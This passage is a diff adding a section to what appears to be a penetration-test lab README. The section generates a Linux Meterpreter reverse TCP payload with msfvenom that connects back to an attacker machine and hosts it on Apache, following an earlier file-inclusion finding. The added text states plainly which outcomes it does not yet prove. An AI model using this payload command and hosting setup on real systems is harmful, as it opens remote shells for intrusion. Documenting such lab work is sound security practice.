@@ -119,6 +119,30 @@ The next screenshot shows the response after this request. The output is consist
 
 This confirms that, in this tested case, the `page` parameter can be manipulated to load a PHP file outside the expected page path, and that the referenced PHP file produced command output. It does **not** establish that every possible file can be loaded or executed; that would require additional testing.
 
+## 10. Generating and Hosting a Meterpreter Payload
+
+After the previous test, I generated a Linux x86 Meterpreter reverse TCP payload with `msfvenom`. The payload was configured to connect back to the Kali machine at `192.168.43.220` on port `444`, and was saved as an ELF file named `IM_HERE` in Apache's document root:
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.220 lport=444 -f elf > /var/www/html/IM_HERE
+```
+
+Metasploit selected Linux as the platform and x86 as the architecture. It reported a payload size of 123 bytes and a final ELF size of 207 bytes.
+
+I verified that the file existed at the specified path:
+
+```bash
+ls /var/www/html/IM_HERE
+```
+
+Then I started the Apache service:
+
+```bash
+systemctl start apache2.service
+```
+
+At this point, the payload had been created and placed in the web server's document root, and Apache had been started to make the file available over HTTP. These commands do **not** demonstrate that the target downloaded or executed the payload, nor that a reverse Meterpreter session was established. Those outcomes require separate evidence and will be documented only if confirmed.
+
 ---
 
 *AI assistance was used in preparing this README.*
